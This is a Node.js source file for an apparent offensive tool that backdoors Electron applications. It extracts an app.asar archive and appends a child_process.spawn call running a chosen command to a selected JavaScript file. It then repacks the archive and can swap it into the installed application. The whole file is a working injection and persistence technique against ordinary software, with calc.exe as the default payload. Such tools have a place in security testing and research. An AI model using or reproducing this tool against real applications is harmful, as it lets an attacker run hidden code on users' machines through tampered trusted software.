const asar = require("asar");
const {program} = require("commander");
const { questionInt } = require("readline-sync");
const { copyFile, readdir, readFile, writeFile, rename, stat, mkdir } = require("node:fs/promises"); 
const {copy, ensureDir} = require("fs-extra");
const path = require("path");
const EVIL_DIR = "evil";

async function retrieveAsar(asarPath) {
    console.log(`[+] Copying asar files...`);
    const localAsar = "./" + path.basename(asarPath);
    const localAsarUnpacked = localAsar + ".unpacked";
    await copy(asarPath, localAsar);
    await copy(`${asarPath}.unpacked`, localAsarUnpacked);
}

async function findJS(inputFile) {
    const contents = asar.listPackage(inputFile);
    const jsFiles = contents.filter(f => (
        (f.indexOf(".js") == f.length - 3) 
        && (f.indexOf(".json") < 0 ) 
        && (f.indexOf("node_modules") < 0 )
    ));
    console.log("[+] Found the following JS files: ");
    for (let i=0; i <= jsFiles.length; i++) {
        console.log(`${i}: ${jsFiles[i]}`);
    }
    const patchChoice = questionInt("Which JS File shall we patch? ");
    const patchFile = jsFiles[patchChoice];
    console.log(`[+] Okay, patching ${patchFile}`);
    return patchFile;
}

async function unpackedCheck(inputFile) {
    return await ensureDir(`${inputFile}.unpacked`);
}

async function pack(inputFile) {
    console.log("[+] Determine excludes");
    // Analyze the unpacked file to determine what to keep out
    // of the packed  archive
    const unpackedPaths = await readdir(`${inputFile}.unpacked`);
    let unpackDirs;
    if (unpackedPaths.length > 1) {
        unpackDirs = "{" + unpackedPaths.join(",") + "}";
    } else {
        unpackDirs = unpackedPaths[0];
    }

    console.log(`[+] Excluding ${unpackDirs}`);
    console.log(`[+] Creating evil ASAR File: ${inputFile}`);
    // process.exit(-1);
    await asar.createPackageWithOptions(`.${path.sep}${EVIL_DIR}/${inputFile}.extracted`, `.${path.sep}${EVIL_DIR}/${inputFile}`, {unpackDir: unpackDirs});
}

async function mutate(asarFile, jsFile, command) {
    console.log(`[+] Adding command ${command}`)
    const jsPath = `.${path.sep}${EVIL_DIR}/${asarFile}.extracted${jsFile}`;
    let jsText = await readFile(jsPath);
    jsText = jsText.toString();
    let cmd = `\nconst tagg = require("child_process");\n`
    cmd += `tagg.spawn("${command}");`
    await writeFile(jsPath, jsText + cmd);
}

async function writeEvil(inputFile, newAsarPath) {
    console.log("[+] Backing Up asar assets");
    await rename(inputFile, `${inputFile}.bak`);
    await rename(`${inputFile}.unpacked`, `${inputFile}.unpacked.bak`);
    console.log("[+] Copying Evil");
    await copyFile(`.${path.sep}${EVIL_DIR}/${newAsarPath}`, inputFile);
    await copy(`.${path.sep}${EVIL_DIR}/${newAsarPath}.unpacked`, `${inputFile}.unpacked`);
}

async function unpack(inputFile) {
    if (unpackedCheck(inputFile)) {
        console.log("[+] Unpacked dir exists");
    } else {
        console.log[`[!] Missing ${inputFile}.unpacked directory!`];
        process.exit(-1);
    }
    console.log("[+] Extracting ASAR");
    asar.extractAll(inputFile, `${EVIL_DIR}/${inputFile}.extracted`);    
}


async function main() {
    
    program.option("-i, --input <inputFile>", "asar file to mutate", "app.asar");
    program.option("-c, --command <command>", "command to insert", "calc.exe");
    program.option("-w --write ", "write evil files directly to application dir");

    program.parse(process.argv);

    const options = program.opts();

    // Make evil dir
    try {
        await stat(EVIL_DIR)
    } catch (error) {
        await mkdir(EVIL_DIR);    
    }

    let newAsarPath = options.input;
    // Copy asar if it's not local to the dir
    if (path.basename(options.input) != options.input) {
        await retrieveAsar(options.input);
        newAsarPath = path.basename(options.input);
    }
    const patchFile = await findJS(newAsarPath);
    await unpack(newAsarPath);
    await mutate(newAsarPath, patchFile, options.command);
    await pack(newAsarPath);

    if (options.write) {
        await writeEvil(options.input, newAsarPath);
        console.log("[+] Evil assets copied over. Don't forget to restore the originals!");
    } else {
        console.log("[+] Done! Move the new app.asar and app.asar.unpacked into place");
    }

}

main();
